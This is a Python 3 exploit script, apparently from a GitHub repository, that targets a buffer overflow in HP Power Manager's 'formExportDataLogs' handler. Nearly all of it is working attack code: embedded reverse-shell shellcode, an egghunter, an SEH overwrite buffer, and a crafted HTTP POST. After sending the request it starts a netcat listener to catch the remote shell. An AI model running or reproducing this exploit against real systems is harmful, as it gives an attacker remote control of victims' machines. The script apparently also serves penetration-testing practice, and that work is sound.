https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3/blob/master/hp_pm_exploit_p3.py

#!/usr/bin/python
# This is a python3 port / extension of the HP Power Manager 'formExportDataLogs' Buffer Overflow Script by Muhammad Haidari
# For the original script visit: https://github.com/Muhammd/HP-Power-Manager
# 
# Usage: python3 hp_pm_exploit_p3.py <Remote IP Address> <Remote Port> <Local Listener Port>
# <Remote IP Address>: ip address the HP Power Manager is running on
# <Remote Port>: port the application is running on
# <Local Listener Port>: local port your shellcode is connecting back to -> script starts nc listener to catch reverse shell
#
# Swap out the shellcode
# Tested on HP Power Manager 4.2 (Build 7) on Windows 7 Ultimate (6.1.7600 N/A Build 7600)
# Author: CountablyInfinite

from urllib import parse
from time import sleep
from sys import argv,exit
from socket import socket,AF_INET,SOCK_STREAM
from os import system

try:
   HOST  = argv[1]
   PORT = int(argv[2]) # port the remote application is running on
   LPORT = int(argv[3]) # port the shellcode is connecting back to -> listener gets sta
   if (len(argv)>4):
      raise IndexError
except IndexError: 
   print("Usage: python3 %s <Remote IP Address> <Remote Port> <Local Listener Port>" % argv[0])
   print("Example: python3 %s 10.10.0.1 80 4411" % argv[0])
   exit()

#msfvenom -p windows/shell_reverse_tcp LHOST=<Your IP> LPORT=4411  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
egg = "b33fb33f"
buf = egg
buf += "\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x83\x99\xaa\xb9\x83\xee\xfc\xe2\xf4\x7f\x71"
buf += "\x28\xb9\x83\x99\xca\x30\x66\xa8\x6a\xdd\x08\xc9\x9a"
buf += "\x32\xd1\x95\x21\xeb\x97\x12\xd8\x91\x8c\x2e\xe0\x9f"
buf += "\xb2\x66\x06\x85\xe2\xe5\xa8\x95\xa3\x58\x65\xb4\x82"
buf += "\x5e\x48\x4b\xd1\xce\x21\xeb\x93\x12\xe0\x85\x08\xd5"
buf += "\xbb\xc1\x60\xd1\xab\x68\xd2\x12\xf3\x99\x82\x4a\x21"
buf += "\xf0\x9b\x7a\x90\xf0\x08\xad\x21\xb8\x55\xa8\x55\x15"
buf += "\x42\x56\xa7\xb8\x44\xa1\x4a\xcc\x75\x9a\xd7\x41\xb8"
buf += "\xe4\x8e\xcc\x67\xc1\x21\xe1\xa7\x98\x79\xdf\x08\x95"
buf += "\xe1\x32\xdb\x85\xab\x6a\x08\x9d\x21\xb8\x53\x10\xee"
buf += "\x9d\xa7\xc2\xf1\xd8\xda\xc3\xfb\x46\x63\xc6\xf5\xe3"
buf += "\x08\x8b\x41\x34\xde\xf1\x99\x8b\x83\x99\xc2\xce\xf0"
buf += "\xab\xf5\xed\xeb\xd5\xdd\x9f\x84\x66\x7f\x01\x13\x98"
buf += "\xaa\xb9\xaa\x5d\xfe\xe9\xeb\xb0\x2a\xd2\x83\x66\x7f"
buf += "\xe9\xd3\xc9\xfa\xf9\xd3\xd9\xfa\xd1\x69\x96\x75\x59"
buf += "\x7c\x4c\x3d\xd3\x86\xf1\x6a\x11\xb2\x57\xc2\xbb\x83"
buf += "\x99\xfa\x30\x65\xf3\xba\xef\xd4\xf1\x33\x1c\xf7\xf8"
buf += "\x55\x6c\x06\x59\xde\xb5\x7c\xd7\xa2\xcc\x6f\xf1\x5a"
buf += "\x0c\x21\xcf\x55\x6c\xeb\xfa\xc7\xdd\x83\x10\x49\xee"
buf += "\xd4\xce\x9b\x4f\xe9\x8b\xf3\xef\x61\x64\xcc\x7e\xc7"
buf += "\xbd\x96\xb8\x82\x14\xee\x9d\x93\x5f\xaa\xfd\xd7\xc9"
buf += "\xfc\xef\xd5\xdf\xfc\xf7\xd5\xcf\xf9\xef\xeb\xe0\x66"
buf += "\x86\x05\x66\x7f\x30\x63\xd7\xfc\xff\x7c\xa9\xc2\xb1"
buf += "\x04\x84\xca\x46\x56\x22\x4a\xa4\xa9\x93\xc2\x1f\x16"
buf += "\x24\x37\x46\x56\xa5\xac\xc5\x89\x19\x51\x59\xf6\x9c"
buf += "\x11\xfe\x90\xeb\xc5\xd3\x83\xca\x55\x6c"

#egghunter.rb -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e b33f -v 'hunter'
hunter =  b""
hunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
hunter += b"\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x89\xd7"
hunter += b"\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buffer = b"\x41" * (721 -len(hunter))
buffer += b"\x90"*30 + hunter
buffer += b"\xeb\xc2\x90\x90"            #JMP SHORT 0xC2 
buffer += b"\xd5\x74\x41" 	              #pop esi # pop ebx # ret 10 (DevManBE.exe)

content= "dataFormat=comma&exportto=file&fileName=%s" % parse.quote_plus(buffer)
content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
payload += "Host: %s\r\n" % HOST
payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
payload += "Accept: %s\r\n" % buf
payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: %s\r\n\r\n" % len(content)
payload += content

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print("[+] HP Power Manager 'formExportDataLogs' Buffer Overflow Exploit")
print("[+] Sending exploit to Ip " +str(HOST)+" on port "+str(PORT)+". Starting local listener on port "+str(LPORT))
s.send(payload.encode('latin1'))
system("nc -nlvp "+ str(LPORT))
s.close()
